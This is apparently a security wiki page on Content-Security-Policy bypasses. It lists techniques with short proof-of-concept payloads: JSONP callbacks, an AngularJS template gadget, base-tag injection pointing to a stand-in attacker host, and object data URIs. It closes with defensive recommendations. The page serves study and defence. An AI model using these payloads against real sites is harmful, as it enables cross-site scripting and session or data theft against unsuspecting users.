---
title: CSP bypass
slug: content-security-policy-bypass
---

{% raw %}

> **TL;DR:** Loose source lists, script-gadgets, jsonp endpoints, or base-uri abuse defeat the policy.

## What it is
Content-Security-Policy restricts where scripts, styles, frames, and connections can come from. A bypass converts an injection primitive (HTML/JS injection) into actual JS execution despite the policy. Bypasses come from policy weakness, dangerous allowlisted origins, missing directives, or DOM gadgets in already-trusted code.

## Preconditions / where it applies
- An HTML/attribute injection sink exists (otherwise nothing to bypass)
- A deployed CSP, but with one or more of: `unsafe-inline`, `unsafe-eval`, broad host allowlists, missing `base-uri`/`object-src`, no nonce/hash

## Technique
1. **Read the policy** — `curl -sI` and check `Content-Security-Policy` header and `<meta>` variants. Use the [CSP Evaluator](https://csp-evaluator.withgoogle.com/) to triage.
2. **`unsafe-inline` present** — bypass is trivial: inject `<script>...</script>`.
3. **JSONP on an allowlisted CDN** — allowlisted hosts hosting JSONP endpoints (`*.googleapis.com`, `*.googletagmanager.com`, several Microsoft hosts) let you do:
   ```html
   <script src="https://allowed.cdn/jsonp?callback=alert(1)//"></script>
   ```
4. **AngularJS / script-gadget**. If an allowlisted CDN hosts AngularJS and the page parses any attacker-controlled attribute, Angular's template engine evaluates expressions:
   ```html
   <div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
   ```
5. **Missing `base-uri`** — inject `<base href="//attacker.tld/">` so relative-path scripts load from attacker.
6. **Missing `object-src`** — `<object data="data:text/html,<script>alert(1)</script>">` or Flash variants.
7. **Path-bypass on host-source** — CSP host-source matches by host+path prefix but only on initial fetch; the redirect target is matched only by origin. Allowlisted `cdn.example.com/safe/` + an open redirect on `cdn.example.com` defeats the path constraint.
8. **`strict-dynamic` + dangling-trust** — under `strict-dynamic`, any script loaded by a trusted (nonce/hash) script is itself trusted. Inject into a *parser-trusted* script's `src` (e.g. via dom-clobbering of an `id`) — see [[dom-clobbering]].
9. **Nonce reuse** — same nonce on multiple responses (caching) lets attacker reuse it cross-page.
10. **`report-only`** — not enforced; treat as "no CSP" for exploitation.
11. **Policy injection** — if request reflects into the response's CSP header (rare but seen), inject a permissive directive.

## Detection and defence
- Aim for nonce-based `script-src 'self' 'nonce-…' 'strict-dynamic'; object-src 'none'; base-uri 'none';`. Drop `unsafe-inline` and `unsafe-eval`.
- Audit every host in the allowlist for JSONP / open redirects / user-uploadable content.
- Enforce `Trusted Types` to kill DOM XSS sinks even with a permissive script-src ([[trusted-types-bypass]] covers limits).
- Use `report-uri`/`report-to` and watch for violations indicating injection attempts.
- Related: [[cross-site-scripting]], [[dom-xss]], [[dom-clobbering]], [[trusted-types-bypass]].

## References
- [PortSwigger — CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) — labs
- [Weichselbaum et al. — CSP is dead, long live CSP](https://research.google/pubs/pub45542/) — strict-dynamic motivation
- [PayloadsAllTheThings — CSP bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSP%20Injection) — payload corpus
{% endraw %}
